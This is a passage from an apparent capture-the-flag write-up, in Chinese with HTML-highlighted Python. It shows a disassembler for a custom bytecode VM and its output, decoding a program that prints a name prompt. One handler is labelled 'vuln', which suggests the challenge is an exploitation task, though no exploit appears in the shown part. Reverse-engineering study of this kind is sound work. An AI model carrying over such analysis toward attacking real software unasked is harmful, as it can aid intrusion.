+</span></span><span class="line"><span class="cl">    <span class="mi">12</span><span class="p">:</span> <span class="s2">&#34;LDB&#34;</span><span class="p">,</span>  <span class="c1"># Load Byte (Reg = *[Imm]) - Note: Logic in C implies Base+Offset usually, checking logic...</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># Case 12: *(&amp;reg) = *(buf + imm). Direct memory load from absolute offset.</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">13</span><span class="p">:</span> <span class="s2">&#34;LDW&#34;</span><span class="p">,</span>  <span class="c1"># Load Word</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">14</span><span class="p">:</span> <span class="s2">&#34;LDD&#34;</span><span class="p">,</span>  <span class="c1"># Load Dword</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">15</span><span class="p">:</span> <span class="s2">&#34;STB&#34;</span><span class="p">,</span>  <span class="c1"># Store Byte ( *[Reg] = Imm_byte )</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">16</span><span class="p">:</span> <span class="s2">&#34;STW&#34;</span><span class="p">,</span>  <span class="c1"># Store Word</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">17</span><span class="p">:</span> <span class="s2">&#34;STD&#34;</span><span class="p">,</span>  <span class="c1"># Store Dword (*[Reg] = Imm_ptr) - Note: Writes pointer to stack/mem</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Type 2: [Op] [Reg1] [Reg2]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># handler: reg_reg</span>
+</span></span><span class="line"><span class="cl"><span class="n">OP_REG_REG</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1</span><span class="p">:</span> <span class="s2">&#34;CMP&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="p">:</span> <span class="s2">&#34;CMPS&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">3</span><span class="p">:</span> <span class="s2">&#34;MOV&#34;</span><span class="p">,</span>   <span class="c1"># R1 = R2</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">4</span><span class="p">:</span> <span class="s2">&#34;XOR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">5</span><span class="p">:</span> <span class="s2">&#34;OR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">6</span><span class="p">:</span> <span class="s2">&#34;AND&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">7</span><span class="p">:</span> <span class="s2">&#34;SHL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">:</span> <span class="s2">&#34;SHR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">9</span><span class="p">:</span> <span class="s2">&#34;XCHG&#34;</span><span class="p">,</span>  <span class="c1"># Exchange</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">10</span><span class="p">:</span> <span class="s2">&#34;ADD&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">11</span><span class="p">:</span> <span class="s2">&#34;SUB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">12</span><span class="p">:</span> <span class="s2">&#34;LDB&#34;</span><span class="p">,</span>  <span class="c1"># R1 = *[Base + R2]</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">13</span><span class="p">:</span> <span class="s2">&#34;LDW&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">14</span><span class="p">:</span> <span class="s2">&#34;LDD&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">15</span><span class="p">:</span> <span class="s2">&#34;STB&#34;</span><span class="p">,</span>  <span class="c1"># *[Base + R2] = R1_byte</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">16</span><span class="p">:</span> <span class="s2">&#34;STW&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">17</span><span class="p">:</span> <span class="s2">&#34;STD&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Type 1: [Op] [Reg]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># handler: reg</span>
+</span></span><span class="line"><span class="cl"><span class="n">OP_REG</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">31</span><span class="p">:</span> <span class="s2">&#34;PUSH&#34;</span><span class="p">,</span> <span class="c1"># PUSH Reg</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">32</span><span class="p">:</span> <span class="s2">&#34;POP&#34;</span><span class="p">,</span>  <span class="c1"># POP Reg</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">33</span><span class="p">:</span> <span class="s2">&#34;INC&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">34</span><span class="p">:</span> <span class="s2">&#34;DEC&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">35</span><span class="p">:</span> <span class="s2">&#34;MOV_SP&#34;</span><span class="p">,</span> <span class="c1"># Reg = SP</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">41</span><span class="p">:</span> <span class="s2">&#34;JMP&#34;</span><span class="p">,</span>    <span class="c1"># Indirect Jump (IP = Reg)</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">42</span><span class="p">:</span> <span class="s2">&#34;JE&#34;</span><span class="p">,</span>     <span class="c1"># Jump if Equal (Reg contain addr? No, logic reuse) - Wait, code check needed</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">43</span><span class="p">:</span> <span class="s2">&#34;JG&#34;</span><span class="p">,</span>     <span class="c1"># Jump Greater</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">44</span><span class="p">:</span> <span class="s2">&#34;JL&#34;</span><span class="p">,</span>     <span class="c1"># Jump Less</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">45</span><span class="p">:</span> <span class="s2">&#34;JGE&#34;</span><span class="p">,</span>    <span class="c1"># Jump Greater Equal</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">46</span><span class="p">:</span> <span class="s2">&#34;JLE&#34;</span><span class="p">,</span>    <span class="c1"># Jump Less Equal</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">47</span><span class="p">:</span> <span class="s2">&#34;JNE&#34;</span><span class="p">,</span>    <span class="c1"># Jump Not Equal</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">48</span><span class="p">:</span> <span class="s2">&#34;CALL&#34;</span><span class="p">,</span>   <span class="c1"># Call Reg</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Type 0: [Op] [Imm24 (Big Endian)]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># handler: vuln</span>
+</span></span><span class="line"><span class="cl"><span class="n">OP_SYS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">36</span><span class="p">:</span> <span class="s2">&#34;SUB_SP&#34;</span><span class="p">,</span> <span class="c1"># SP -= Imm*4</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">37</span><span class="p">:</span> <span class="s2">&#34;ADD_SP&#34;</span><span class="p">,</span> <span class="c1"># SP += Imm*4</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">41</span><span class="p">:</span> <span class="s2">&#34;JMP&#34;</span><span class="p">,</span>    <span class="c1"># Relative Jump</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">42</span><span class="p">:</span> <span class="s2">&#34;JE&#34;</span><span class="p">,</span>     <span class="c1"># Relative JE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">43</span><span class="p">:</span> <span class="s2">&#34;JG&#34;</span><span class="p">,</span>     <span class="c1"># Relative JG</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">44</span><span class="p">:</span> <span class="s2">&#34;JL&#34;</span><span class="p">,</span>     <span class="c1"># Relative JL</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">45</span><span class="p">:</span> <span class="s2">&#34;JGE&#34;</span><span class="p">,</span>    <span class="c1"># Relative JGE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">46</span><span class="p">:</span> <span class="s2">&#34;JLE&#34;</span><span class="p">,</span>    <span class="c1"># Relative JLE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">47</span><span class="p">:</span> <span class="s2">&#34;JNE&#34;</span><span class="p">,</span>    <span class="c1"># Relative JNE</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">48</span><span class="p">:</span> <span class="s2">&#34;CALL&#34;</span><span class="p">,</span>   <span class="c1"># Relative Call</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">51</span><span class="p">:</span> <span class="s2">&#34;SYS_OPEN&#34;</span><span class="p">,</span>  <span class="c1"># Speculation based on common syscall args</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">52</span><span class="p">:</span> <span class="s2">&#34;SYS_READ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">53</span><span class="p">:</span> <span class="s2">&#34;SYS_WRITE&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">54</span><span class="p">:</span> <span class="s2">&#34;SYSCALL_4&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">55</span><span class="p">:</span> <span class="s2">&#34;SYSCALL_5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">56</span><span class="p">:</span> <span class="s2">&#34;SYSCALL_6&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">57</span><span class="p">:</span> <span class="s2">&#34;SYSCALL_7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">58</span><span class="p">:</span> <span class="s2">&#34;SYSCALL_8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">59</span><span class="p">:</span> <span class="s2">&#34;RET&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode_vm</span><span class="p">(</span><span class="n">code_buffer</span><span class="p">,</span> <span class="n">entry_point</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pc</span> <span class="o">=</span> <span class="n">entry_point</span>
+</span></span><span class="line"><span class="cl">    <span class="n">max_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">code_buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Analyzing VM Code. Size: </span><span class="si">{</span><span class="n">max_len</span><span class="si">:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">, Entry Point: </span><span class="si">{</span><span class="n">pc</span><span class="si">:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="s1">&#39;Address&#39;</span><span class="si">:</span><span class="s2">&lt;10</span><span class="si">}</span><span class="s2"> | </span><span class="si">{</span><span class="s1">&#39;Bytes&#39;</span><span class="si">:</span><span class="s2">&lt;20</span><span class="si">}</span><span class="s2"> | </span><span class="si">{</span><span class="s1">&#39;Disassembly&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Simple Linear Sweep Disassembly</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Note: If there is data mixed with code, this might desync. </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># But for a basic VM, linear usually works until a RET/JMP to backwards.</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">pc</span> <span class="o">&lt;</span> <span class="n">max_len</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">start_pc</span> <span class="o">=</span> <span class="n">pc</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pc</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">code_buffer</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="n">raw_op</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op_type</span> <span class="o">=</span> <span class="n">raw_op</span> <span class="o">&amp;</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">        <span class="n">opcode</span> <span class="o">=</span> <span class="n">raw_op</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">instr_bytes</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mnem</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">operands</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">op_type</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span> <span class="c1"># REG_IMM</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># Fetch: 1 byte reg, 4 bytes imm (little endian)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">reg</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">imm_bytes</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">2</span> <span class="p">:</span> <span class="n">pc</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">imm</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">imm_bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">pc</span> <span class="o">+=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">                <span class="n">instr_bytes</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">start_pc</span><span class="p">:</span><span class="n">pc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">mnem</span> <span class="o">=</span> <span class="n">OP_IMM</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;UNK_IMM_</span><span class="si">{</span><span class="n">opcode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">operands</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;R</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s2">, 0x</span><span class="si">{</span><span class="n">imm</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">op_type</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span> <span class="c1"># REG_REG</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># Fetch: 1 byte reg1, 1 byte reg2</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r1</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r2</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">pc</span> <span class="o">+=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">                <span class="n">instr_bytes</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">start_pc</span><span class="p">:</span><span class="n">pc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">mnem</span> <span class="o">=</span> <span class="n">OP_REG_REG</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;UNK_RR_</span><span class="si">{</span><span class="n">opcode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">operands</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;R</span><span class="si">{</span><span class="n">r1</span><span class="si">}</span><span class="s2">, R</span><span class="si">{</span><span class="n">r2</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">op_type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># REG (Single)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># Fetch: 1 byte reg</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r1</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">                <span class="n">instr_bytes</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">start_pc</span><span class="p">:</span><span class="n">pc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">mnem</span> <span class="o">=</span> <span class="n">OP_REG</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;UNK_R_</span><span class="si">{</span><span class="n">opcode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">operands</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;R</span><span class="si">{</span><span class="n">r1</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">op_type</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="c1"># VULN (Syscall/Jumps/Imm24)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># Fetch: 3 bytes imm (Big Endian logic in C: operand &lt;&lt; 8 | byte)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">b1</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">b2</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">b3</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">pc</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">imm</span> <span class="o">=</span> <span class="p">(</span><span class="n">b1</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">b2</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">b3</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="c1"># Handle relative logic for Jumps (0x29 -&gt; 0x30 in C switch, which is 41-48 opcode)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># C logic: if (operand &amp; 0x800000) target = ip - (op &amp; 0x7FFFFF) else ip + ...</span>
+</span></span><span class="line"><span class="cl">                <span class="n">is_rel_jump</span> <span class="o">=</span> <span class="p">(</span><span class="mi">41</span> <span class="o">&lt;=</span> <span class="n">opcode</span> <span class="o">&lt;=</span> <span class="mi">48</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">target_str</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;0x</span><span class="si">{</span><span class="n">imm</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">is_rel_jump</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">offset</span> <span class="o">=</span> <span class="n">imm</span> <span class="o">&amp;</span> <span class="mh">0x7FFFFF</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">imm</span> <span class="o">&amp;</span> <span class="mh">0x800000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">target</span> <span class="o">=</span> <span class="n">start_pc</span> <span class="o">-</span> <span class="n">offset</span> <span class="c1"># roughly current IP check</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">target</span> <span class="o">=</span> <span class="n">start_pc</span> <span class="o">+</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">target_str</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;LOC_</span><span class="si">{</span><span class="n">target</span><span class="si">:</span><span class="s2">05x</span><span class="si">}</span><span class="s2"> (Rel)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">pc</span> <span class="o">+=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">                <span class="n">instr_bytes</span> <span class="o">=</span> <span class="n">code_buffer</span><span class="p">[</span><span class="n">start_pc</span><span class="p">:</span><span class="n">pc</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="n">mnem</span> <span class="o">=</span> <span class="n">OP_SYS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;UNK_SYS_</span><span class="si">{</span><span class="n">opcode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">operands</span> <span class="o">=</span> <span class="n">target_str</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># Print formatted</span>
+</span></span><span class="line"><span class="cl">            <span class="n">byte_str</span> <span class="o">=</span> <span class="s2">&#34; &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">instr_bytes</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">start_pc</span><span class="si">:</span><span class="s2">05x</span><span class="si">}</span><span class="s2">      | </span><span class="si">{</span><span class="n">byte_str</span><span class="si">:</span><span class="s2">&lt;20</span><span class="si">}</span><span class="s2"> | </span><span class="si">{</span><span class="n">mnem</span><span class="si">:</span><span class="s2">&lt;8</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">operands</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">start_pc</span><span class="si">:</span><span class="s2">05x</span><span class="si">}</span><span class="s2">      | EOF mid-instruction&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">VM_FILENAME</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error: File &#39;</span><span class="si">{</span><span class="n">VM_FILENAME</span><span class="si">}</span><span class="s2">&#39; not found.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">VM_FILENAME</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># main() in C: read(fd, &amp;s-&gt;ip, 4uLL);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">entry_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">entry_data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error: File too small.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">entry_point</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">entry_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># main() in C: while ( read(fd, buf, ...) )</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="c1"># The IP in C is relative to the buffer start.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># The file contains [IP: 4bytes] [CODE: N bytes]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># We pass the code buffer and the IP read from header.</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decode_vm</span><span class="p">(</span><span class="n">code_data</span><span class="p">,</span> <span class="n">entry_point</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>最后得到执行流程</p>
+<pre tabindex="0"><code>[*] Analyzing VM Code. Size: 0x1d6, Entry Point: 0x0
+------------------------------------------------------------
+Address    | Bytes                | Disassembly
+------------------------------------------------------------
+00000      | 90 00 00 08          | SUB_SP   0x8
+00004      | 8d 00                | MOV_SP   R0
+00006      | 47 00 57 68 61 74    | STD      R0, 0x74616857
+0000c      | 2b 00 04 00 00 00    | ADD      R0, 0x4
+00012      | 47 00 27 73 20 79    | STD      R0, 0x79207327
+00018      | 2b 00 04 00 00 00    | ADD      R0, 0x4
+0001e      | 47 00 6f 75 72 20    | STD      R0, 0x2072756f
+00024      | 2b 00 04 00 00 00    | ADD      R0, 0x4
+0002a      | 47 00 6e 61 6d 65    | STD      R0, 0x656d616e
+00030      | 2b 00 04 00 00 00    | ADD      R0, 0x4
+00036      | 43 00 3f 0a 00 00    | STW      R0, 0xa3f
+0003c      | 8d 00                | MOV_SP   R0
+0003e      | 7d 00                | PUSH     R0
+00040      | c0 00 01 66          | CALL     LOC_001a6 (Rel)
